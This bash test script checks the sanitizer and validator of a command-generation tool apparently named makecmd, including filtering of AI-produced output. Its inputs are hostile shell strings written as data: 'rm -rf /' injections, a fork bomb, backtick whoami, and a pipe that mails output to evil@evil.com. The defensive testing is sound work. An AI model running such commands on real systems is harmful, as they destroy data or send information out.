#!/usr/bin/env bash
#
# test_injection.sh - Security tests for command injection prevention

# Don't use strict mode to allow tests to continue after failures
set +e

# Test setup
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

# Minimal log function
log() { :; }

# Source libraries
source "$PROJECT_ROOT/lib/sanitizer.sh"
source "$PROJECT_ROOT/lib/validator.sh"

# Color codes
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

echo "Running makecmd Security Tests"
echo "=============================="
echo

TESTS_PASSED=0
TESTS_FAILED=0

# Function to run a test
run_test() {
    local test_name="$1"
    local result="$2"
    local expected="$3"
    
    echo -n "Testing $test_name... "
    
    if [[ "$result" == "$expected" ]]; then
        echo -e "${GREEN}PASS${NC}"
        ((TESTS_PASSED++))
    else
        echo -e "${RED}FAIL${NC}"
        echo "  Expected: $expected"
        echo "  Got: $result"
        ((TESTS_FAILED++))
    fi
}

# Test 1: Command substitution
input='$(rm -rf /)'
result=$(sanitize_input "$input" 2>/dev/null)
run_test "command substitution" "$result" '\$\(rm -rf /\)'

# Test 2: Backticks
input='`whoami`'
result=$(sanitize_input "$input" 2>/dev/null)
run_test "backticks" "$result" '\`whoami\`'

# Test 3: Semicolon
input='ls; rm -rf /'
result=$(sanitize_input "$input" 2>/dev/null)
run_test "semicolon injection" "$result" 'ls\; rm -rf /'

# Test 4: Pipe
input='ls | mail evil@evil.com'
result=$(sanitize_input "$input" 2>/dev/null)
run_test "pipe injection" "$result" 'ls \| mail evil@evil.com'

# Test 5: Command validation - dangerous command
if validate_command "rm -rf /" "false" 2>/dev/null; then
    result="not blocked"
else
    result="blocked"
fi
run_test "dangerous command blocking" "$result" "blocked"

# Test 6: Fork bomb
if validate_command ":(){:|:&};:" "false" 2>/dev/null; then
    result="not blocked"
else
    result="blocked"
fi
run_test "fork bomb blocking" "$result" "blocked"

# Test 7: Output sanitization - newline
output=$'ls -la\nrm -rf /'
result=$(sanitize_claude_output "$output" 2>/dev/null)
if [[ "$result" == *$'\n'* ]]; then
    result="has newline"
else
    result="no newline"
fi
run_test "newline removal" "$result" "no newline"

# Test 8: Output sanitization - backticks
output='ls `whoami`'
result=$(sanitize_claude_output "$output" 2>/dev/null)
if [[ "$result" == *'`'* ]]; then
    result="has backticks"
else
    result="no backticks"
fi
run_test "backtick removal from output" "$result" "no backticks"

# Test 9: Safe mode - sudo
if validate_command "sudo ls" "true" 2>/dev/null; then
    result="allowed"
else
    result="blocked"
fi
run_test "safe mode sudo blocking" "$result" "blocked"

# Test 10: Safe mode - allowed command
if validate_command "ls -la" "true" 2>/dev/null; then
    result="allowed"
else
    result="blocked"
fi
run_test "safe mode allows read operations" "$result" "allowed"

echo
echo "Summary: $TESTS_PASSED passed, $TESTS_FAILED failed"

if [[ $TESTS_FAILED -eq 0 ]]; then
    exit 0
else
    exit 1
fi